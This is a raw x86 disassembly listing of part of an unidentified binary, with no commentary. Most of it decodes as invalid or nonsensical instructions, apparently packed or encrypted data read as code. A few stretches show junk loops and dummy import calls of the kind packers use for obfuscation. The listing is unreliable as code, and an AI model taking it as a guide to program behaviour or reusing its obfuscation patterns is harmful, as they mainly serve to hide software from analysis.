  419036:	cmp    ebx,edi
  419038:	pushf  
  419039:	out    dx,eax
  41903a:	(bad)  
  41903b:	sti    
  41903c:	retf   
  41903d:	enter  0x23f8,0x9f
  419041:	rcr    DWORD PTR [ebx],0xc5
  419044:	sbb    ecx,ebx
  419046:	rol    bh,1
  419048:	loope  0x41902d
  41904a:	pop    ecx
  41904b:	mov    al,0x65
  41904d:	lahf   
  41904e:	popf   
  41904f:	pop    ds
  419050:	ds das 
  419052:	enter  0x818c,0x48
  419056:	jp     0x419072
  419058:	cmp    ah,ch
  41905a:	stos   BYTE PTR es:[edi],al
  41905b:	xchg   esp,ecx
  41905d:	mov    ecx,0xd6df7bf1
  419062:	push   esp
  419063:	and    al,0xca
  419065:	fisttp DWORD PTR [eax+ecx*8-0x2a]
  419069:	mov    es,WORD PTR [ecx]
  41906b:	into   
  41906c:	jae    0x419003
  41906e:	xchg   DWORD PTR [esi+eax*2-0x3312d117],edx
  419075:	ficomp DWORD PTR [eax+0x72f7e320]
  41907b:	mov    DWORD PTR [ecx+ebx*2],esi
  41907e:	push   esp
  41907f:	sahf   
  419080:	mov    ch,0x84
  419082:	mov    edi,0xf4a9bb4d
  419087:	xchg   ebp,eax
  419088:	sbb    al,BYTE PTR [ecx+0x556a49cd]
  41908e:	or     BYTE PTR [eax],dh
  419090:	xor    BYTE PTR [ebx],cl
  419092:	inc    edx
  419093:	inc    esi
  419094:	xor    DWORD PTR [esi],0xffffffba
  419097:	addr16 mov esi,0xfea68599
  41909d:	nop
  41909e:	leave  
  41909f:	(bad)  
  4190a0:	fs xchg edx,eax
  4190a2:	pop    edx
  4190a3:	sub    eax,0xa39febd0
  4190a8:	push   cs
  4190a9:	pop    ebx
  4190aa:	mov    ecx,0x1dd3a06e
  4190af:	ja     0x4190b1
  4190b1:	in     al,0xcc
  4190b3:	aas    
  4190b4:	test   al,0xd9
  4190b6:	xor    al,0x86
  4190b8:	imul   edi,DWORD PTR [edi+ecx*1],0x8148d17c
  4190bf:	dec    edi
  4190c0:	cmp    bh,BYTE PTR [edx-0x29]
  4190c3:	adc    al,BYTE PTR [edx-0x6bd960f5]
  4190c9:	js     0x419130
  4190cb:	push   ebp
  4190cc:	loop   0x41914a
  4190ce:	lea    ebp,[ecx-0xf]
  4190d1:	fsubrp st(1),st
  4190d3:	push   es
  4190d4:	shr    BYTE PTR [edx-0x57],1
  4190d7:	outs   dx,DWORD PTR ds:[esi]
  4190d8:	xlat   BYTE PTR ds:[ebx]
  4190d9:	psrlw  mm4,QWORD PTR [edi-0x39276b2f]
  4190e0:	jbe    0x419125
  4190e2:	out    dx,al
  4190e3:	mov    edi,0xf29f9773
  4190e8:	sbb    BYTE PTR [edi+eax*2+0x27],0x66
  4190ed:	pop    edx
  4190ee:	push   ebp
  4190ef:	push   ebx
  4190f0:	gs fwait
  4190f2:	(bad)  
  4190f3:	enter  0x54b4,0xd8
  4190f7:	xor    eax,0xe714c185
  4190fc:	push   0x76d0f570
  419101:	bound  ecx,QWORD PTR [ebx]
  419103:	dec    esi
  419104:	push   ss
  419105:	cld    
  419106:	icebp  
  419107:	jnp    0x41917b
  419109:	or     cl,BYTE PTR [edx-0x3a3d9429]
  41910f:	rcl    BYTE PTR [ebx+0x72],cl
  419112:	xchg   BYTE PTR [esi],cl
  419114:	mov    dh,0x5e
  419116:	xchg   esp,eax
  419117:	fidivr WORD PTR [edi+0x6892bd8c]
  41911d:	push   ds
  41911e:	call   0x8c35ac56
  419123:	jle    0x4190a6
  419125:	add    al,0x43
  419127:	sub    cl,BYTE PTR [edi-0x36]
  41912a:	push   cs
  41912b:	mov    dl,0x99
  41912d:	sbb    BYTE PTR [ebx+0x39],dl
  419130:	(bad)  
  419131:	stc    
  419132:	fs jl  0x4191b1
  419135:	(bad)  [esi+ecx*4]
  419138:	ins    DWORD PTR es:[edi],dx
  419139:	adc    eax,0x5d3fabcf
  41913e:	nop
  41913f:	arpl   bp,cx
  419141:	and    BYTE PTR [ecx+eax*2],ch
  419144:	ja     0x419183
  419146:	add    al,0xfb
  419148:	aaa    
  419149:	int3   
  41914a:	cmc    
  41914b:	cli    
  41914c:	and    ch,cl
  41914e:	push   esi
  41914f:	imul   edx,DWORD PTR [ecx-0x2e],0xffffffa7
  419153:	sub    al,0x76
  419155:	inc    edx
  419156:	nop
  419157:	cdq    
  419158:	sub    bh,ah
  41915a:	in     eax,dx
  41915b:	rcl    BYTE PTR cs:[esi+0x66],1
  41915f:	pop    ecx
  419160:	xchg   ecx,eax
  419161:	mov    dx,0x7e84
  419165:	pop    esp
  419166:	mov    bl,0x95
  419168:	inc    edi
  419169:	fcmovu st,st(4)
  41916b:	add    bl,0xdf
  41916e:	sbb    DWORD PTR [edi+edi*2],eax
  419171:	sbb    cl,BYTE PTR [edi+0x5b]
  419174:	arpl   di,cx
  419176:	test   DWORD PTR [eax+0x46],0x48f031c9
  41917d:	xor    ecx,DWORD PTR [esi+eax*8+0x67]
  419181:	pop    ds
  419182:	inc    ebx
  419183:	pop    esp
  419184:	xor    eax,0xac10ca1f
  419189:	mov    ?,edi
  41918b:	shr    cl,1
  41918d:	add    eax,DWORD PTR [eax]
  41918f:	add    BYTE PTR [eax],al
  419191:	mov    eax,DWORD PTR [ebp+0x10]
  419194:	leave  
  419195:	ret    0xc
  419198:	push   ebp
  419199:	mov    ebp,esp
  41919b:	sub    esp,0x30
  41919e:	jmp    0x4193d3
  4191a3:	rcl    edx,cl
  4191a5:	ret    0xc13e
  4191a8:	into   
  4191a9:	rcl    ecx,cl
  4191ab:	daa    
  4191ac:	jle    0x419228
  4191ae:	mov    cs,WORD PTR [edx+0x84d1d5a]
  4191b4:	lds    edi,FWORD PTR [edi+0x78]
  4191b7:	adc    BYTE PTR [esi+0x78],bh
  4191ba:	js     0x41920c
  4191bc:	rcr    BYTE PTR [ebp+0xafb74c9],cl
  4191c2:	jne    0x41914d
  4191c4:	ret    
  4191c5:	div    BYTE PTR [ecx+0x51330517]
  4191cb:	mov    dh,0xc
  4191cd:	sar    DWORD PTR [eax-0x50326ee0],cl
  4191d3:	jge    0x41924f
  4191d5:	iret   
  4191d6:	ins    BYTE PTR es:[edi],dx
  4191d7:	imul   edx,edx,0xfffffff7
  4191da:	test   al,0x56
  4191dc:	mov    cl,0x92
  4191de:	pop    ds
  4191df:	out    dx,al
  4191e0:	clc    
  4191e1:	fldcw  WORD PTR [ebx]
  4191e3:	mov    dl,bl
  4191e5:	xor    BYTE PTR [esi+0x41],ch
  4191e8:	mov    DWORD PTR [eax],ebx
  4191ea:	ins    DWORD PTR es:[edi],dx
  4191eb:	aam    0xf9
  4191ed:	mov    esp,0x43819185
  4191f2:	imul   ecx,eax,0x900d48d2
  4191f8:	ins    BYTE PTR es:[edi],dx
  4191f9:	dec    esi
  4191fa:	fldcw  WORD PTR [ebp-0x62]
  4191fd:	stc    
  4191fe:	push   ds
  4191ff:	loop   0x419274
  419201:	xchg   ecx,eax
  419202:	call   0x57be:0x661762b1
  419209:	push   eax
  41920a:	fldcw  WORD PTR [eax]
  41920c:	jmp    0x6f18:0xdd616cc5
  419213:	mov    al,ah
  419215:	inc    esp
  419216:	pop    esi
  419217:	or     BYTE PTR [edx+0x39a708e5],0x10
  41921e:	sub    bh,bl
  419220:	dec    edx
  419221:	shr    dl,1
  419223:	popa   
  419224:	mov    dl,ch
  419226:	push   es
  419227:	std    
  419228:	aaa    
  419229:	push   ds
  41922a:	es xchg ecx,eax
  41922c:	(bad)  gs:[ecx+eiz*2-0x4da76fd7]
  419234:	jg     0x41920e
  419236:	adc    eax,0x65104ab6
  41923b:	jo     0x4191e8
  41923d:	mov    esp,0x4ff2cee2
  419242:	test   dh,al
  419244:	jmp    0x7d7fea16
  419249:	test   al,0x6c
  41924b:	pop    es
  41924c:	push   eax
  41924d:	sti    
  41924e:	add    bl,BYTE PTR [ebx-0x661f95d]
  419254:	idiv   DWORD PTR [edx]
  419256:	adc    DWORD PTR [esi],esp
  419258:	repnz stos DWORD PTR es:[edi],eax
  41925a:	mov    eax,0x8f63dab2
  41925f:	push   ebx
  419260:	or     BYTE PTR [eax],al
  419262:	mov    edi,DWORD PTR [ebx-0x22]
  419265:	xchg   DWORD PTR [eax+0x49],eax
  419268:	push   edx
  419269:	loopne 0x4191fe
  41926b:	stos   BYTE PTR es:[edi],al
  41926c:	ror    DWORD PTR ds:0xa44831f8,cl
  419272:	inc    eax
  419273:	add    BYTE PTR [ecx],bl
  419275:	scas   al,BYTE PTR es:[edi]
  419276:	xchg   BYTE PTR [eax],al
  419278:	out    dx,al
  419279:	jp     0x41929b
  41927b:	(bad)  [esi-0x4dbffecd]
  419281:	sub    al,0xd2
  419283:	scas   eax,DWORD PTR es:[edi]
  419284:	daa    
  419285:	xor    al,0xbf
  419287:	out    0xeb,al
  419289:	sahf   
  41928a:	cs (bad) 
  41928c:	jp     0x4192a3
  41928e:	jl     0x41921a
  419290:	mov    esp,0x19df70ce
  419295:	outs   dx,BYTE PTR ds:[esi]
  419296:	fldcw  WORD PTR [edx-0x502c86b4]
  41929c:	push   es
  41929d:	inc    ecx
  41929e:	jmp    0x5d04:0x902805f9
  4192a5:	ins    DWORD PTR es:[edi],dx
  4192a6:	add    ebp,esi
  4192a8:	xor    BYTE PTR [esi-0x2],cl
  4192ab:	jge    0x419311
  4192ad:	xchg   ecx,eax
  4192ae:	cmp    edi,ecx
  4192b0:	loope  0x419281
  4192b2:	mov    edi,0xa2cfbc21
  4192b7:	jmp    0x419337
  4192b9:	ins    DWORD PTR es:[edi],dx
  4192ba:	or     BYTE PTR [edi+0x5e],ah
  4192bd:	stc    
  4192be:	ret    0x3fba
  4192c1:	and    edx,ebx
  4192c3:	test   al,0xb7
  4192c5:	ficom  WORD PTR [eax]
  4192c7:	ins    BYTE PTR es:[edi],dx
  4192c8:	lea    edx,ds:0x5523b3ae
  4192ce:	sbb    eax,0x4432e237
  4192d3:	xor    eax,ebp
  4192d5:	add    dh,BYTE PTR [eax+edx*1]
  4192d8:	mov    bl,0xa8
  4192da:	sti    
  4192db:	(bad)  
  4192dc:	call   0x65936bb7
  4192e1:	pop    es
  4192e2:	add    al,0xdc
  4192e4:	fdivrp st(5),st
  4192e6:	je     0x4192b6
  4192e8:	mov    ds:0x4797a442,eax
  4192ed:	xor    ebx,0xffffffc9
  4192f0:	cmp    ebx,DWORD PTR ds:0xa8e1f526
  4192f6:	aam    0xf1
  4192f8:	add    eax,0x22a6ff1d
  4192fd:	jge    0x4192ba
  4192ff:	sub    ch,ch
  419301:	lea    esi,[ebp-0x4e]
  419304:	sbb    BYTE PTR [edi-0x5a],dh
  419307:	inc    ebx
  419308:	(bad)  
  419309:	adc    al,0x7
  41930b:	dec    esi
  41930c:	hlt    
  41930d:	adc    al,0x90
  41930f:	ret    
  419310:	xor    al,0x7f
  419312:	stos   BYTE PTR es:[edi],al
  419313:	jp     0x4192f8
  419315:	es mov cl,0x3
  419318:	jbe    0x4192dc
  41931a:	shl    DWORD PTR [ecx+ebp*4+0x48],0x70
  41931f:	jg     0x419333
  419321:	sbb    eax,0xe2dba2aa
  419326:	ja     0x419385
  419328:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419329:	mov    esp,0x2c7fde71
  41932e:	out    dx,eax
  41932f:	sub    ah,BYTE PTR [esi+edx*4-0x3d]
  419333:	ret    0x6093
  419336:	inc    esp
  419337:	call   0x97258056
  41933c:	dec    edx
  41933d:	mov    bl,0x2c
  41933f:	dec    edx
  419340:	jecxz  0x4193bc
  419342:	jle    0x419394
  419344:	cmp    dl,BYTE PTR [edi]
  419346:	cld    
  419347:	dec    esi
  419348:	jg     0x419395
  41934a:	shl    BYTE PTR [ecx+0x49],1
  41934d:	pop    es
  41934e:	push   es
  41934f:	rcr    BYTE PTR [eax],0xe0
  419352:	xor    eax,0x5b0cb85f
  419357:	std    
  419358:	sub    esi,ebp
  41935a:	loopne 0x4192f0
  41935c:	sti    
  41935d:	sbb    ebx,DWORD PTR [edi-0x1f8bc269]
  419363:	std    
  419364:	push   esp
  419365:	(bad)  
  419366:	push   ss
  419367:	sbb    eax,0x37436636
  41936c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41936d:	cmp    edx,DWORD PTR [edx+ecx*2]
  419370:	push   ebx
  419371:	xlat   BYTE PTR ds:[ebx]
  419372:	push   ecx
  419373:	sub    dl,dl
  419375:	aaa    
  419376:	lods   al,BYTE PTR ds:[esi]
  419377:	int    0x1c
  419379:	jg     0x4193f5
  41937b:	fdiv   st,st(2)
  41937d:	fmul   st,st(5)
  41937f:	xor    edx,edx
  419381:	fist   DWORD PTR [esi+0xa2feb17]
  419387:	(bad)  
  419388:	xor    ah,BYTE PTR [eax-0x2573103c]
  41938e:	(bad)  
  41938f:	dec    edi
  419390:	icebp  
  419391:	rol    BYTE PTR [ebp+0x75e95c6b],1
  419397:	push   0xffffff92
  419399:	dec    edi
  41939a:	push   ds
  41939b:	pop    ds
  41939c:	mov    ecx,0xf2132602
  4193a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4193a2:	add    DWORD PTR [ebp-0x44232e1c],esp
  4193a8:	dec    edx
  4193a9:	jae    0x41932d
  4193ab:	hlt    
  4193ac:	xor    esi,DWORD PTR [edi+ebp*1]
  4193af:	inc    ebp
  4193b0:	in     al,0x7d
  4193b2:	push   edi
  4193b3:	out    0x87,eax
  4193b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4193b6:	xorps  xmm4,XMMWORD PTR [esi-0x1a]
  4193ba:	or     DWORD PTR [eax+ecx*2-0x20],edx
  4193be:	fidiv  DWORD PTR [eax+eiz*8+0x4c]
  4193c2:	mov    bl,0x37
  4193c4:	dec    esp
  4193c5:	pop    eax
  4193c6:	adc    ebp,ecx
  4193c8:	or     BYTE PTR [ecx],bl
  4193ca:	xchg   ecx,eax
  4193cb:	rcl    eax,cl
  4193cd:	outs   dx,BYTE PTR ds:[esi]
  4193ce:	dec    edx
  4193cf:	je     0x419369
  4193d1:	test   DWORD PTR [esi+0x38fc45c7],ecx
  4193d7:	test   DWORD PTR [eax+edi*8-0x5762da7f],ebx
  4193de:	inc    edx
  4193df:	add    BYTE PTR [eax],al
  4193e1:	add    BYTE PTR [eax],al
  4193e3:	add    BYTE PTR [ebx],dh
  4193e5:	leave  
  4193e6:	add    ecx,DWORD PTR ds:0x42a89d
  4193ec:	inc    ecx
  4193ed:	mov    DWORD PTR ds:0x42a89d,ecx
  4193f3:	cmp    DWORD PTR ds:0x42a89d,0x24
  4193fa:	jne    0x41940b
  419400:	push   0x4f45
  419405:	call   DWORD PTR ds:0x41d278
  41940b:	cmp    DWORD PTR ds:0x42a89d,0x1b
  419412:	jb     0x4193e4
  419418:	and    DWORD PTR ds:0x42a821,0x0
  419422:	jmp    0x419434
  419427:	mov    ecx,DWORD PTR ds:0x42a821
  41942d:	inc    ecx
  41942e:	mov    DWORD PTR ds:0x42a821,ecx
  419434:	cmp    DWORD PTR ds:0x42a821,0x1d
  41943b:	jae    0x419470
  419441:	cmp    DWORD PTR ds:0x42a821,0x1e
  419448:	jne    0x419461
  41944e:	push   0x42a9af
  419453:	push   DWORD PTR [ebp-0x20]
  419456:	push   0x1
  419458:	push   DWORD PTR [ebp-0xc]
  41945b:	call   DWORD PTR ds:0x41d118
  419461:	jmp    0x419427
  419466:	adc    DWORD PTR ds:0x42a7d1,0x7c2
  419470:	mov    DWORD PTR [ebp-0x18],0xf89c8539
  419477:	and    DWORD PTR ds:0x42a82d,0x0
  419481:	mov    ecx,DWORD PTR ds:0x42a82d
  419487:	inc    ecx
  419488:	mov    DWORD PTR ds:0x42a82d,ecx
  41948e:	cmp    DWORD PTR ds:0x42a82d,0x25
  419495:	jne    0x4194a6
  41949b:	push   0x42aa68
  4194a0:	call   DWORD PTR ds:0x41d27c
  4194a6:	cmp    DWORD PTR ds:0x42a82d,0x18
  4194ad:	jb     0x419481
  4194b3:	mov    ecx,DWORD PTR [ebp-0x4]
  4194b6:	mov    eax,ds:0x42a825
  4194bb:	and    DWORD PTR ds:0x42a795,eax
  4194c1:	push   ebx
  4194c2:	add    ebx,ebx
  4194c4:	mov    eax,0x7510850
  4194c9:	and    DWORD PTR ds:0x42a78d,ecx
  4194cf:	xor    ecx,eax
  4194d1:	movzx  ebx,BYTE PTR ds:0x42a799
  4194d8:	adc    DWORD PTR ds:0x42a891,ebx
  4194de:	mov    ebx,0x327298
  4194e3:	adc    DWORD PTR ds:0x42a781,0x50ad
  4194ed:	add    ecx,ebx
  4194ef:	inc    DWORD PTR ds:0x42a89d
  4194f5:	mov    DWORD PTR [ebp-0x1c],ecx
  4194f8:	mov    ecx,DWORD PTR [ebp+0x14]
  4194fb:	push   esi
  4194fc:	mov    DWORD PTR ds:0x42a815,0x238f
  419506:	push   edi
  419507:	test   ecx,ecx
  419509:	mov    DWORD PTR ds:0x42a859,0x1f7e
  419513:	je     0x419758
  419519:	jmp    0x41974e
  41951e:	retf   0xd03c
  419521:	(bad)
  419524:	fld    st(3)
  419526:	scas   eax,DWORD PTR es:[edi]
  419527:	inc    eax
  419528:	adc    DWORD PTR [esi-0x4d],eax
  41952b:	inc    ebx
  41952c:	test   BYTE PTR [edx+0x20],0xcb
  419530:	jg     0x4195aa
  419532:	adc    BYTE PTR [esi+0x78],bh
  419535:	js     0x4194bc
  419537:	int3   
  419538:	sub    DWORD PTR [ecx+0x2a63ba98],edx
  41953e:	mov    ch,0x2b
  419540:	mov    ebp,0x5b7d1a2d
  419545:	jecxz  0x419547
  419547:	pop    edi
  419548:	aas    
  419549:	test   BYTE PTR [eax-0x52],ah
  41954c:	push   ebx
  41954d:	ds adc ebp,ecx
  419550:	aad    0x64
  419552:	dec    ebp
  419553:	aam    0x96
  419555:	jmp    0x33af7c35
  41955a:	psrad  mm2,mm3
  41955d:	(bad)  
  41955f:	cmp    eax,0xd1aab2d
  419564:	mov    edi,0x19e42b61
  419569:	mov    cl,0xe
  41956b:	pop    es
  41956c:	in     al,0x56
  41956e:	enter  0xebd8,0x5a
  419572:	cld    
  419573:	aas    
  419574:	adc    BYTE PTR [ebx],dl
  419576:	dec    eax
  419577:	xchg   ebx,eax
  419578:	enter  0xf508,0xb2
  41957c:	mov    eax,ds:0xd0608ade
  419581:	adc    BYTE PTR [edi-0x3c],cl
  419584:	lock inc esi
  419586:	mov    edi,DWORD PTR [ebp-0x11]
  419589:	mov    ?,WORD PTR [eax]
  41958b:	dec    ebx
  41958c:	mov    DWORD PTR [edi-0x65e4577d],esp
  419592:	jne    0x419598
  419594:	push   cs
  419595:	mov    ebx,0xa0f28c36
  41959a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41959b:	imul   ecx,DWORD PTR [eax],0xffffff87
  41959e:	sbb    DWORD PTR [eax-0x6d],edx
  4195a1:	(bad)  
  4195a3:	mov    al,ds:0x1f6b2fdc
  4195a8:	jno    0x4195f9
  4195aa:	shl    DWORD PTR [ecx+0x42],cl
  4195ad:	lods   al,BYTE PTR ds:[esi]
  4195ae:	mov    al,ds:0x977801b6
  4195b3:	retf   
  4195b4:	aam    0xb4
  4195b6:	cmp    al,0xa2
  4195b8:	lods   al,BYTE PTR ds:[esi]
  4195b9:	dec    ebx
  4195ba:	mov    ebp,0xfd63f6db
  4195bf:	jmp    0x4195da
  4195c1:	inc    edx
  4195c2:	sub    bl,BYTE PTR [ebx+0x356179a6]
  4195c8:	scas   al,BYTE PTR es:[edi]
  4195c9:	xlat   BYTE PTR ds:[ebx]
  4195ca:	mov    esp,db5
  4195cd:	lock cdq 
  4195cf:	push   esi
  4195d0:	jmp    0x41957c
  4195d2:	xlat   BYTE PTR ds:[ebx]
  4195d3:	mov    ebp,0x81f46d38
  4195d8:	fild   WORD PTR [eax]
  4195da:	pshufw mm7,QWORD PTR [ebp+0x33711c51],0x9a
  4195e2:	bound  ecx,QWORD PTR [edi]
  4195e4:	sahf   
  4195e5:	fs and eax,0xa0b85177
  4195eb:	xchg   cl,dl
  4195ed:	and    al,0x4f
  4195ef:	xlat   BYTE PTR ds:[ebx]
  4195f0:	test   DWORD PTR [esi-0x492050b5],esi
  4195f6:	or     al,0xba
  4195f8:	loop   0x4195fa
  4195fa:	inc    esi
  4195fb:	sbb    DWORD PTR [ebp-0x24961b3a],ebp
  419601:	dec    esp
  419602:	test   cl,ch
  419604:	aas    
  419605:	call   0x4061:0x49aa300c
  41960c:	or     edx,DWORD PTR [edx+eax*8]
  41960f:	pusha  
  419610:	js     0x4195a1
  419612:	sub    al,0x96
  419614:	dec    eax
  419615:	mov    dh,0x8b
  419617:	dec    esi
  419618:	mov    bh,0xa
  41961a:	addr16 in al,0xdd
  41961d:	in     eax,0xa
  41961f:	(bad)  
  419620:	push   eax
  419621:	xchg   DWORD PTR [edx-0x20],edx
  419624:	sub    al,0x1c
  419626:	add    edi,DWORD PTR [ebx]
  419628:	lds    ecx,FWORD PTR [esi+0x21]
  41962b:	fnstenv [ebp+0x2e]
  41962e:	out    dx,eax
  41962f:	and    BYTE PTR [eax+0x30643376],dh
  419635:	jp     0x4196a8
  419637:	enter  0xab3c,0x2b
  41963b:	mov    edi,0x203ce002
  419640:	sub    DWORD PTR [edx],edi
  419642:	fidivr DWORD PTR ds:0x49ed39b0
  419648:	imul   ebx,DWORD PTR [ebp-0x1c],0x2a
  41964c:	mov    ebp,0x95bfaa77
  419651:	cmp    DWORD PTR [ebp-0x48b5701e],edx
  419657:	dec    DWORD PTR [ecx-0x47]
  41965a:	jne    0x419675
  41965c:	leave  
  41965d:	cmc    
  41965e:	jo     0x41968a
  419660:	inc    ecx
  419661:	leave  
  419662:	je     0x41961d
  419664:	add    DWORD PTR [ebx+0x37],ebx
  419667:	sbb    DWORD PTR [esi+0x21],eax
  41966a:	(bad)  
  41966b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41966c:	or     BYTE PTR [ecx-0x56007613],dh
  419672:	add    DWORD PTR [ebx-0x7d],edi
  419675:	lods   al,BYTE PTR ds:[esi]
  419676:	push   ebx
  419677:	xchg   ecx,eax
  419678:	lock aad 0xda
  41967b:	xchg   ebp,eax
  41967c:	test   bh,dh
  41967e:	push   ecx
  41967f:	data16 shl BYTE PTR [esi+ebp*2-0x6dd88018],1
  419687:	inc    ebp
  419688:	jo     0x419673
  41968a:	cli    
  41968b:	retf   0x45ec
  41968e:	add    BYTE PTR [edi-0x34d4f723],al
  419694:	mov    eax,ds:0x492be2b5
  419699:	(bad)  
  41969b:	mov    bh,0x2a
  41969d:	rol    dl,0x9c
  4196a0:	loop   0x4196cc
  4196a2:	sub    dl,BYTE PTR [edi+0x677b9901]
  4196a8:	mov    dh,0x2e
  4196aa:	ret    
  4196ab:	add    DWORD PTR [ecx],edi
  4196ad:	sar    DWORD PTR [ebp+0x4],0x30
  4196b1:	jle    0x4196fd
  4196b3:	mov    dl,0xc8
  4196b5:	ja     0x41966d
  4196b7:	and    ch,BYTE PTR [edx-0xa6cf60d]
  4196bd:	mov    al,ds:0x8ed23292
  4196c2:	add    esi,esi
  4196c4:	lea    ebx,[edx]
  4196c6:	fdiv   st,st(1)
  4196c8:	sar    BYTE PTR [ebp+0x12],1
  4196cb:	sahf   
  4196cc:	push   0xffffffad
  4196ce:	fnsave [ebx+0x71]
  4196d1:	fistp  QWORD PTR [ebx-0x50]
  4196d4:	and    BYTE PTR ds:0x3541,dl
  4196d9:	adc    bl,bh
  4196db:	push   edx
  4196dc:	ror    ah,0xb3
  4196df:	cmc    
  4196e0:	test   al,0x4d
  4196e2:	cmp    eax,0x7589598b
  4196e7:	pop    es
  4196e8:	xlat   BYTE PTR ds:[ebx]
  4196e9:	test   BYTE PTR ds:0x23bec4ef,bh
  4196ef:	jl     0x4196c2
  4196f1:	xor    eax,0x623f5dd7
  4196f6:	dec    esp
  4196f7:	nop
  4196f8:	int    0xbe
  4196fa:	repnz mov al,0x29
  4196fd:	repz adc esp,DWORD PTR [ebx+0x1e]
  419701:	in     al,0x1e
  419703:	jo     0x4196c0
  419705:	xor    DWORD PTR [edi+0x701f2375],ebx
  41970b:	nop
  41970c:	mov    ebx,0xea02e6d0
  419711:	popf   
  419712:	add    ebx,DWORD PTR [edi-0x24bb4667]
  419718:	xor    eax,0x630d3e0b
  41971d:	sub    edx,DWORD PTR [eax]
  41971f:	push   esp
  419720:	(bad)  
  419721:	jp     0x41977a
  419723:	fstp   TBYTE PTR [edx-0xf962170]
  419729:	xchg   ebp,eax
  41972a:	fdiv   QWORD PTR [ecx+0x379ded39]
  419730:	aas    
  419731:	add    eax,0x8fbd3f62
  419736:	push   ds
  419737:	xchg   DWORD PTR [esi+eax*1+0x1f],ebp
  41973b:	scas   eax,DWORD PTR es:[edi]
  41973c:	and    al,0xad
  41973e:	push   edi
  41973f:	add    ecx,DWORD PTR [edi]
  419741:	dec    esp
  419742:	in     eax,dx
  419743:	scas   al,BYTE PTR es:[edi]
  419744:	cs in  eax,0xf2
  419747:	mov    ebp,0x1264ea91
  41974c:	jecxz  0x419733
  41974e:	mov    ecx,DWORD PTR [ebp+0x14]
  419751:	add    esi,esi
  419753:	mov    ecx,DWORD PTR [ecx]
  419755:	mov    DWORD PTR [ebp-0x1c],ecx
  419758:	imul   edx,eax
  41975b:	xor    edi,DWORD PTR ds:0x42a821
  419761:	mov    ecx,0x4573
  419766:	add    edx,ecx
  419768:	sub    DWORD PTR ds:0x42a89d,ecx
  41976e:	mov    esi,0x7879
  419773:	mov    edi,0x1556
  419778:	not    DWORD PTR ds:0x42a865
  41977e:	xchg   esi,ecx
  419780:	add    DWORD PTR ds:0x42a7d5,0x585c
  41978a:	jmp    0x4199bf
  41978f:	iret   
  419790:	iret   
  419791:	(bad)  
  419792:	xlat   BYTE PTR ds:[ebx]
  419793:	(bad)  
  419794:	xlat   BYTE PTR ds:[ebx]
  419795:	iret   
  419796:	xlat   BYTE PTR ds:[ebx]
  419797:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419798:	call   0x20bdddeb
  41979d:	jl     0x41974e
  41979f:	cmp    cl,cl
  4197a1:	jg     0x41981b
  4197a3:	adc    BYTE PTR [esi+0x78],bh
  4197a6:	js     0x419796
  4197a8:	cmp    eax,0x706efa73
  4197ad:	les    eax,FWORD PTR [esi-0x6d728490]
  4197b3:	aas    
  4197b4:	scas   eax,DWORD PTR es:[edi]
  4197b5:	or     esi,esi
  4197b7:	push   ecx
  4197b8:	in     eax,0xa5
  4197ba:	or     DWORD PTR [esi],0x23
  4197bd:	mov    cl,0xbb
  4197bf:	retf   
  4197c0:	repz or DWORD PTR [esi-0x5c],esi
  4197c4:	inc    ebx
  4197c5:	cwde   
  4197c6:	fbld   TBYTE PTR [ebx+esi*8-0x10fd98fc]
  4197cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4197ce:	repz mov bh,0x7a
  4197d1:	jae    0x419820
  4197d3:	fucomi st,st(3)
  4197d5:	inc    edi
  4197d6:	xchg   edi,eax
  4197d7:	jg     0x419785
  4197d9:	cmc    
  4197da:	xor    esi,DWORD PTR [ebx]
  4197dc:	and    al,0x43
  4197de:	ror    DWORD PTR [ebx],0xbd
  4197e1:	xor    DWORD PTR [eax-0x7cf3d6fd],0x1d
  4197e8:	scas   eax,DWORD PTR es:[edi]
  4197e9:	enter  0x9995,0x4c
  4197ed:	test   BYTE PTR [ebp-0x13],ah
  4197f0:	cmp    ebp,esp
  4197f2:	outs   dx,BYTE PTR ds:[esi]
  4197f3:	jnp    0x41981a
  4197f5:	ds popa 
  4197f7:	jmp    0x99cfe316
  4197fc:	mov    ds:0xc7664c61,eax
  419801:	pop    ds
  419802:	push   edx
  419803:	inc    ecx
  419804:	or     ah,BYTE PTR [ebp-0x57be882e]
  41980a:	pop    edi
  41980b:	mov    esp,0xb2f69876
  419810:	fnstenv [edi]
  419812:	dec    edx
  419813:	xor    BYTE PTR [edx+esi*1+0x5fff290e],0x13
  41981b:	sub    al,0x54
  41981d:	mov    esi,0xdae95013
  419822:	sub    eax,0x27356bd4
  419827:	push   esi
  419828:	mov    ebx,ss
  41982a:	sbb    edx,edx
  41982c:	fsubrp st(7),st
  41982e:	dec    ebp
  41982f:	in     eax,dx
  419830:	xor    esp,DWORD PTR [ecx-0x4f085c6e]
  419836:	or     eax,DWORD PTR [edi+0x6a966e44]
  41983c:	xchg   esi,eax
  41983d:	add    edi,eax
  41983f:	mov    edi,0x199bb054
  419844:	lock and al,0x65
  419847:	ins    DWORD PTR es:[edi],dx
  419848:	or     BYTE PTR [edi],dl
  41984a:	icebp  
  41984b:	push   ss
  41984c:	adc    BYTE PTR [esi+0x59],bl
  41984f:	fistp  DWORD PTR [ecx+0x4d]
  419852:	int    0x56
  419854:	sub    dh,BYTE PTR [ecx]
  419856:	cmp    al,0x8
  419858:	not    DWORD PTR [esp+ecx*1-0x74]
  41985c:	js     0x41983d
  41985e:	(bad)  
  41985f:	push   eax
  419860:	or     bh,BYTE PTR [eax+ecx*4+0x13a41e06]
  419867:	rol    ah,cl
  419869:	clc    
  41986a:	adc    cl,BYTE PTR [edi+0x7c]
  41986d:	add    al,BYTE PTR [eax+ebp*2+0x5a6c0fd6]
  419874:	pop    ecx
  419875:	(bad)  
  419876:	(bad)  
  419877:	dec    DWORD PTR [edi-0x3f]
  41987a:	dec    edx
  41987c:	pop    es
  41987d:	xor    DWORD PTR [esi],edx
  41987f:	mov    dh,0x2c
  419881:	mov    edi,0x21342b7f
  419886:	or     eax,0x9d2069a9
  41988b:	jbe    0x419871
  41988d:	mov    eax,ds:0xae78210b
  419892:	mov    edi,0x2ca2225c
  419897:	inc    ebx
  419898:	add    ecx,edi
